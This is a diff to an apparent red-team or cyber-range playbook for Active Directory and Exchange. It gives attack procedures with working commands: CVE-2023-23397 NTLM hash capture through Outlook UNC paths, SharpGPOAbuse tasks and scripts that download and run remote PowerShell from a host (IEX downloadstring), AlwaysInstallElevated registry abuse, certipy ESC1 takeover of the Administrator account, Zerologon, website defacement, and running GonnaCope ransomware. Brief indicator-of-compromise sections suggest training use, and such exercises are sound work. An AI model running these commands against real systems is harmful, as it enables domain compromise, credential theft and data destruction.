@@ -1028,8 +1028,11 @@ Examples:
 <p>First, install a Domain Controller. The instructions can be found <a href="https://www.virtualgyanis.com/post/step-by-step-how-to-install-and-configure-domain-controller-on-windows-server-2019">here.</a></p>
 <p>Second, install Exchange.</p>
 <ol>
-<li>Download Exchange Server 2019 ISO from this <a href="https://www.microsoft.com/en-us/download/details.aspx?id=105713">link</a> on your Server 2019</li>
-<li>In Server Manager click Add roles and features 
+<li>
+<p>Download Exchange Server 2019 ISO from this <a href="https://www.microsoft.com/en-us/download/details.aspx?id=105713">link</a> on your Server 2019</p>
+</li>
+<li>
+<p>In Server Manager click Add roles and features </p>
 <ol>
 <li>Click Next </li>
 <li>Choose Role-based... and click Next </li>
@@ -1040,73 +1043,105 @@ Examples:
 <li>Click Close when it's available </li>
 </ol>
 </li>
-<li>In Server Manager click on Tools and select AD LDS Setup Wizard 
+<li>
+<p>In Server Manager click on Tools and select AD LDS Setup Wizard </p>
 <ol>
 <li>Click Next for all defaults then click Finish </li>
 </ol>
 </li>
-<li>Open PS as admin and run the following command 
+<li>
+<p>Open PS as admin and run the following command </p>
 <pre><code class="language-powershell">Install-WindowsFeature NET-Framework-45-Features, Server-Media-Foundation, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, RSAT-Clustering-Mgmt, RSAT-Clustering-PowerShell, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation, RSAT-ADDS
 </code></pre>
 </li>
+<li>
+<p>Install the prerequisites by following the instructions from this <a href="https://learn.microsoft.com/en-us/exchange/plan-and-deploy/prerequisites?view=exchserver-2019#exchange-2019-prerequisites-for-preparing-active-directory">link</a> and restart the box</p>
+</li>
+<li>
+<p>Right-click on the Exchange Server 2019 ISO and select Mount</p>
+</li>
+<li>
+<p>The new drive should open automatically, but open file explorer and open the DVD drive labeled ExchangeServer2019 if it doesn't open automatically.</p>
+</li>
+<li>
+<p>Run Setup</p>
+<ol>
+<li>Select Don't check for updates right now and click next</li>
+<li>Click next</li>
+<li>Accept and click next</li>
+<li>Select Use recommended settings and click next</li>
+<li>Select Mailbox Role and Automatically... then click next</li>
+<li>Click next</li>
+<li>Enter an organization name of your choice and click next</li>
+<li>Click next</li>
+<li>If you installed all the prerequisites, the check should be successful. If it asks you to install additional features or packages, install them and continue</li>
+<li>Click install, and the setup should take around 20 - 30 minutes</li>
+<li>Click finish when complete and restart the box</li>
 </ol>
-<pre><code>5. Install the prerequisites by following the instructions from this [link](https://learn.microsoft.com/en-us/exchange/plan-and-deploy/prerequisites?view=exchserver-2019#exchange-2019-prerequisites-for-preparing-active-directory) and restart the box
-6. Right-click on the Exchange Server 2019 ISO and select Mount
-7. The new drive should open automatically, but open file explorer and open the DVD drive labeled ExchangeServer2019 if it doesn't open automatically.
-8. Run Setup
-	1. Select Don't check for updates right now and click next
-	2. Click next
-	3. Accept and click next
-	4. Select Use recommended settings and click next
-	5. Select Mailbox Role and Automatically... then click next
-	6. Click next
-	7. Enter an organization name of your choice and click next
-	8. Click next
-	9. If you installed all the prerequisites, the check should be successful. If it asks you to install additional features or packages, install them and continue
-	10. Click install, and the setup should take around 20 - 30 minutes
-	11. Click finish when complete and restart the box
-9.  Test that the configuration is correct by sending e-mails internally
-	1. Open a web browser and navigate to `https://ip-address-of-exchange-server-here/ecp`
-	2. Login with your DC Admin credentials
-	3. Click the + sign and select User mailbox to create a user. You can create mailboxes for existing users in the domain, or vice versa -- you can create a new mailbox for a new user on the Exchange Server, which will create a user on the DC
-	4. Enter an Alias
-	5. Select New User and enter appropriate information in the fields
-	6. Click Browse under Organizational Unit and select Users, then click Save
-	7. Navigate to `https://ip-address-of-exchange-server-here/owa` and send a test e-mail to the new user.
-	8. Sign out from the Administrator, and sign back in as the newly created user to verify that the e-mails can be sent back and forth.
-10. Open Windows Firewall
-	1. Create Inbound and Outbound rules that allow:
-		1. Ports 25, 389, 50636
-		2. ICMP (for debugging purposes, if needed)
-
-Third, set up workstations with Outlook 2019 Clients.
-1. Join your workstation to the AD environment you set up above. `Note: Ensure that you assign a DNS server as the DC`
-2. Install Microsoft Office 2019
-	1. Microsoft Office 2019, as well as any activation needed can be found on this [github repo](https://github.com/tylerdotrar/Activate-MicrosoftOffice)
-	2. Upon opening Outlook, enter the e-mail address of the new account you created earlier, and click Advanced Options &gt; Let me set up my account manually &gt; Connect
-		1. Select Exchange (Not Exchange 2013 or earlier)
-3. Make sure you can send and receive e-mails by communicating with the Exchange Server.
-
-## Execution
-
-### Method 1 - PowerShell Script
-
-The POC PowerShell script can be found [here](https://github.com/ka7ana/CVE-2023-23397). All that is required is that you change the recipient's e-mail address, and the UNC path
-![[Pasted image 20240118131309.png]]
-`Note: The listening server doesn't necessarily need to be an SMB share. You can use things like Responder tool as well`
-#### Indicators of Compromise
-- PowerShell execution logs
-- NTLM hash traveling to an external network 
-- Authentication request via UNC path
-
-### Method 2 - Sending Appointments On Outlook Client
-1. On the Outlook client, click New Items -&gt; Appointment 
-   ![[Pasted image 20240118131751.png]]
-3. Manually select the sound file (to be played upon receiving the appointment reminder e-mail) and enter the UNC Path to the server 
-   ![[Pasted image 20240118131906.png]]![[Pasted image 20240118132014.png]]
-#### Indicators of Compromise
-- NTLM hash traveling to an external network 
-- Authentication request via UNC path</code></pre>
+</li>
+<li>
+<p>Test that the configuration is correct by sending e-mails internally</p>
+<ol>
+<li>Open a web browser and navigate to <code>https://ip-address-of-exchange-server-here/ecp</code></li>
+<li>Login with your DC Admin credentials</li>
+<li>Click the + sign and select User mailbox to create a user. You can create mailboxes for existing users in the domain, or vice versa -- you can create a new mailbox for a new user on the Exchange Server, which will create a user on the DC</li>
+<li>Enter an Alias</li>
+<li>Select New User and enter appropriate information in the fields</li>
+<li>Click Browse under Organizational Unit and select Users, then click Save</li>
+<li>Navigate to <code>https://ip-address-of-exchange-server-here/owa</code> and send a test e-mail to the new user.</li>
+<li>Sign out from the Administrator, and sign back in as the newly created user to verify that the e-mails can be sent back and forth.</li>
+</ol>
+</li>
+<li>
+<p>Open Windows Firewall</p>
+<ol>
+<li>Create Inbound and Outbound rules that allow:
+<ol>
+<li>Ports 25, 389, 50636</li>
+<li>ICMP (for debugging purposes, if needed)</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<p>Third, set up workstations with Outlook 2019 Clients.</p>
+<ol>
+<li>Join your workstation to the AD environment you set up above. <code>Note: Ensure that you assign a DNS server as the DC</code></li>
+<li>Install Microsoft Office 2019
+<ol>
+<li>Microsoft Office 2019, as well as any activation needed can be found on this <a href="https://github.com/tylerdotrar/Activate-MicrosoftOffice">github repo</a></li>
+<li>Upon opening Outlook, enter the e-mail address of the new account you created earlier, and click Advanced Options &gt; Let me set up my account manually &gt; Connect
+<ol>
+<li>Select Exchange (Not Exchange 2013 or earlier)</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>Make sure you can send and receive e-mails by communicating with the Exchange Server.</li>
+</ol>
+<h2 id="execution-17"><a class="header" href="#execution-17">Execution</a></h2>
+<h3 id="method-1---powershell-script"><a class="header" href="#method-1---powershell-script">Method 1 - PowerShell Script</a></h3>
+<p>The POC PowerShell script can be found <a href="https://github.com/ka7ana/CVE-2023-23397">here</a>. All that is required is that you change the recipient's e-mail address, and the UNC path
+<img src="./images/Pasted%20image%2020240118131309.png" alt="image" />
+<code>Note: The listening server doesn't necessarily need to be an SMB share. You can use things like Responder tool as well</code></p>
+<h4 id="indicators-of-compromise-26"><a class="header" href="#indicators-of-compromise-26">Indicators of Compromise</a></h4>
+<ul>
+<li>PowerShell execution logs</li>
+<li>NTLM hash traveling to an external network </li>
+<li>Authentication request via UNC path</li>
+</ul>
+<h3 id="method-2---sending-appointments-on-outlook-client"><a class="header" href="#method-2---sending-appointments-on-outlook-client">Method 2 - Sending Appointments On Outlook Client</a></h3>
+<ol>
+<li>On the Outlook client, click New Items -&gt; Appointment 
+<img src="./images/Pasted%20image%2020240118131751.png" alt="image" /></li>
+<li>Manually select the sound file (to be played upon receiving the appointment reminder e-mail) and enter the UNC Path to the server 
+![image](./images/Pasted%20image%2020240118131906.png]]![[Pasted image 20240118132014.png)</li>
+</ol>
+<h4 id="indicators-of-compromise-27"><a class="header" href="#indicators-of-compromise-27">Indicators of Compromise</a></h4>
+<ul>
+<li>NTLM hash traveling to an external network </li>
+<li>Authentication request via UNC path</li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="active-directory"><a class="header" href="#active-directory">Active Directory</a></h1>
 <ul>
 <li><a href="./sharpgpoabuse.html">SharpGPOAbuse</a></li>
@@ -1124,7 +1159,7 @@ The POC PowerShell script can be found [here](https://github.com/ka7ana/CVE-2023
 <p>In order to abuse GPO's, a configured Active Directory domain must be completely set up, and you must have access to a user that has privileges to modify GPO's. In order to modify a GPO, this utility relies on LDAP and SMB as well. This binary is also a PE executable, it expects to be ran on a Windows machine that's already been joined to the target domain controller.</p>
 <h2 id="setup-18"><a class="header" href="#setup-18">Setup</a></h2>
 <p>Download the <a href="https://github.com/NukingDragons/SharpGPOAbuse/releases">current release executable</a>, and either reflectively load or upload to a domain-joined Windows machine that you have access to.</p>
-<h2 id="execution-17"><a class="header" href="#execution-17">Execution</a></h2>
+<h2 id="execution-18"><a class="header" href="#execution-18">Execution</a></h2>
 <h3 id="method-1---adduserrights"><a class="header" href="#method-1---adduserrights">Method 1 - AddUserRights</a></h3>
 <p>The following are the available options to add rights to a user account via GPO:</p>
 <pre><code>Options required to add new user rights:
@@ -1138,7 +1173,7 @@ The POC PowerShell script can be found [here](https://github.com/ka7ana/CVE-2023
 <p>This command will add the &quot;SeTakeOwnership&quot; and &quot;SeRemoteInteractiveLogonRight&quot; privileges to the bob.smith user account. </p>
 <pre><code>SharpGPOAbuse.exe --AddUserRights --UserRights &quot;SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight&quot; --UserAccount bob.smith --GPOName &quot;Vulnerable GPO&quot;
 </code></pre>
-<h4 id="indicators-of-compromise-26"><a class="header" href="#indicators-of-compromise-26">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-28"><a class="header" href="#indicators-of-compromise-28">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <h3 id="method-2---addlocaladmin"><a class="header" href="#method-2---addlocaladmin">Method 2 - AddLocalAdmin</a></h3>
 <p>The following are the available options to add a local admin via GPO:</p>
@@ -1151,7 +1186,7 @@ The POC PowerShell script can be found [here](https://github.com/ka7ana/CVE-2023
 <p>The following will create a new local administrator account named &quot;bob.smith&quot;:</p>
 <pre><code>SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName &quot;Vulnerable GPO&quot;
 </code></pre>
-<h4 id="indicators-of-compromise-27"><a class="header" href="#indicators-of-compromise-27">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-29"><a class="header" href="#indicators-of-compromise-29">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <h3 id="method-3---adduserscript--addcomputerscript"><a class="header" href="#method-3---adduserscript--addcomputerscript">Method 3 - AddUserScript / AddComputerScript</a></h3>
 <p>The following are the available options to add a user or computer script via GPO:</p>
@@ -1166,7 +1201,7 @@ The POC PowerShell script can be found [here](https://github.com/ka7ana/CVE-2023
 <p>The following will add a user script, this syntax also works with &quot;--AddComputerScript&quot;:</p>
 <pre><code>SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents &quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\&quot;&quot; --GPOName &quot;Vulnerable GPO&quot;
 </code></pre>
-<h4 id="indicators-of-compromise-28"><a class="header" href="#indicators-of-compromise-28">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-30"><a class="header" href="#indicators-of-compromise-30">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <h3 id="method-4---addusertask--addcomputertask"><a class="header" href="#method-4---addusertask--addcomputertask">Method 4 - AddUserTask / AddComputerTask</a></h3>
 <p>The following are the available options to add a user or computer task via GPO:</p>
@@ -1200,7 +1235,7 @@ Additional Computer Task Options:
 <p>The following will add a user task, this syntax also works with &quot;--AddComputerTask&quot;:</p>
 <pre><code>SharpGPOAbuse.exe --AddUserTask --TaskName &quot;Update&quot; --Author DOMAIN\Admin --Command &quot;cmd.exe&quot; --Arguments &quot;/c powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\&quot;&quot; --GPOName &quot;Vulnerable GPO&quot;
 </code></pre>
-<h4 id="indicators-of-compromise-29"><a class="header" href="#indicators-of-compromise-29">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-31"><a class="header" href="#indicators-of-compromise-31">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <h3 id="method-5---addregistrykey"><a class="header" href="#method-5---addregistrykey">Method 5 - AddRegistryKey</a></h3>
 <p>The following are the available options to add a registry key via GPO:</p>
@@ -1222,7 +1257,7 @@ Additional Computer Task Options:
 <p>The following will add a registry key:</p>
 <pre><code>SharpGPOAbuse.exe --AddRegistryKey --Hive HKLM --KeyPath &quot;Software\Policies\Microsoft\Windows\Installer&quot; --KeyName AlwaysInstallElevated --KeyType REG_DWORD --KeyData 1 --GPOName &quot;Vulnerable GPO&quot;
 </code></pre>
-<h4 id="indicators-of-compromise-30"><a class="header" href="#indicators-of-compromise-30">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-32"><a class="header" href="#indicators-of-compromise-32">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="certificate-template-abuse"><a class="header" href="#certificate-template-abuse">Certificate Template Abuse</a></h1>
 <h2 id="summary-19"><a class="header" href="#summary-19">Summary</a></h2>
@@ -1246,7 +1281,7 @@ Additional Computer Task Options:
 <p>With the new template created, close the window and then click on &quot;Certificate Templates&quot;, and then go to Action -&gt; New -&gt; Certificate Template to Issue. Select the template that was just created in the following window and click OK.</p>
 <p><img src="./images/Pasted%20image%2020230719130337.png" alt="image" /></p>
 <p>LDAP needs to have SSL enabled to authenticate using the certificates. Reboot the DC after all of these changes have been made. God fucking help you if LDAPS doesn't work, cause he didn't help me.</p>
-<h2 id="execution-18"><a class="header" href="#execution-18">Execution</a></h2>
+<h2 id="execution-19"><a class="header" href="#execution-19">Execution</a></h2>
 <h3 id="method-1---esc1"><a class="header" href="#method-1---esc1">Method 1 - ESC1</a></h3>
 <p>The first step is to determine if any certificate template is vulnerable. Using the <a href="https://github.com/ly4k/Certipy">certipy</a> utility, run the following command to query the ADCS service:</p>
 <pre><code class="language-bash">certipy find -u username -p password -dc-ip &lt;ip&gt;
@@ -1275,7 +1310,7 @@ certipy cert -pfx administrator.pfx -nocert -out administrator.key
 </code></pre>
 <p><img src="./images/Pasted%20image%2020230718150333.png" alt="passthecert" /></p>
 <p>At this point the Administrator users password should be changed to &quot;Pwned!!&quot;.</p>
-<h4 id="indicators-of-compromise-31"><a class="header" href="#indicators-of-compromise-31">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-33"><a class="header" href="#indicators-of-compromise-33">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="active-directory-vulnerabilities"><a class="header" href="#active-directory-vulnerabilities">Active Directory Vulnerabilities</a></h1>
 <ul>
@@ -1288,7 +1323,7 @@ certipy cert -pfx administrator.pfx -nocert -out administrator.key
 <p>This exploit requires at least one DC to be set up and configured. The DC <em>must</em> not have the patch, i.e. install the DC from before August 11th, 2020, or attempt to delete all of the KB security updates which may not work. <strong>Windows Server 2008 R2 SP1</strong> requires an ESU license for the patch to apply, which is atypical, making this version the ideal target for configuring a range with this vulnerability.</p>
 <h2 id="setup-20"><a class="header" href="#setup-20">Setup</a></h2>
 <p>If the prerequisites have been met, then any Zerologon exploit should work out of the box.</p>
-<h2 id="execution-19"><a class="header" href="#execution-19">Execution</a></h2>
+<h2 id="execution-20"><a class="header" href="#execution-20">Execution</a></h2>
 <h3 id="method-1---changing-dcs-machine-account-password"><a class="header" href="#method-1---changing-dcs-machine-account-password">Method 1 - Changing DC's Machine Account Password</a></h3>
 <p>Clone the repository at https://github.com/risksense/zerologon, by either downloading the zip file or running the following command:</p>
 <pre><code class="language-bash">git clone https://github.com/risksense/zerologon
@@ -1306,7 +1341,7 @@ certipy cert -pfx administrator.pfx -nocert -out administrator.key
 <p><img src="./images/Pasted%20image%2020230629110911.png" alt="image" /></p>
 <pre><code class="language-bash">python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH
 </code></pre>
-<h4 id="indicators-of-compromise-32"><a class="header" href="#indicators-of-compromise-32">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-34"><a class="header" href="#indicators-of-compromise-34">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="impact"><a class="header" href="#impact">Impact</a></h1>
 <ul>
@@ -1320,13 +1355,13 @@ certipy cert -pfx administrator.pfx -nocert -out administrator.key
 <p>The target webserver must support PHP in order to host the defaced webroot contents.</p>
 <h2 id="setup-21"><a class="header" href="#setup-21">Setup</a></h2>
 <p>Download <a href="./misc-attachments/papa_www.zip">this</a> file, it contains the contents to be placed in the targets webroot. Often times this is in /var/www/html, but check the running webservers config file to verify.</p>
-<h2 id="execution-20"><a class="header" href="#execution-20">Execution</a></h2>
+<h2 id="execution-21"><a class="header" href="#execution-21">Execution</a></h2>
 <h3 id="method-1---extract-using-unzip"><a class="header" href="#method-1---extract-using-unzip">Method 1 - Extract using Unzip</a></h3>
 <p>To upload the file to the machine, one possible way is to use <code>scp</code> or to host a python webserver and then use <code>wget</code> on the target webserver. Prior to extracting, either delete or move the contents of the old webroot. Then, once the file is uploaded, its time to locate and enter the webroot of the server, then run the following command:</p>
 <pre><code class="language-bash">cd /var/www/html # Most common webroot location
 unzip /path/to/papa_www.zip
 </code></pre>
-<h4 id="indicators-of-compromise-33"><a class="header" href="#indicators-of-compromise-33">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-35"><a class="header" href="#indicators-of-compromise-35">Indicators of Compromise</a></h4>
 <p>TODO, but its going to be loud and obvious</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="gonnacope"><a class="header" href="#gonnacope">GonnaCope</a></h1>
 <h2 id="summary-22"><a class="header" href="#summary-22">Summary</a></h2>
@@ -1339,14 +1374,14 @@ unzip /path/to/papa_www.zip
 <h2 id="setup-22"><a class="header" href="#setup-22">Setup</a></h2>
 <p>Download the 7z Compressed ransomware from <a href="https://github.com/vxunderground/MalwareSourceCode/tree/main/Win32/Ransomware">here.</a> The password is 'infected' without the single quotes. 
 Place the ransomware onto the system via download or GPO.</p>
-<h2 id="execution-21"><a class="header" href="#execution-21">Execution</a></h2>
+<h2 id="execution-22"><a class="header" href="#execution-22">Execution</a></h2>
 <h3 id="method-1---execution-via-command-prompt-or-rdp-session"><a class="header" href="#method-1---execution-via-command-prompt-or-rdp-session">Method 1 - Execution via command prompt or RDP session.</a></h3>
 <p>Within the shell type:</p>
 <pre><code class="language-powershell">.\G0nnaC0pe.bat
 </code></pre>
 <p>OR</p>
 <p>Navigate to the directory of the ransomware and double click the <code>G0nnaC0pe.bat</code> file.</p>
-<h4 id="indicators-of-compromise-34"><a class="header" href="#indicators-of-compromise-34">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-36"><a class="header" href="#indicators-of-compromise-36">Indicators of Compromise</a></h4>
 <ul>
 <li>
 <p>The ransomware encrypts files found and adds a &quot;.cope&quot; extension to the filename.</p>
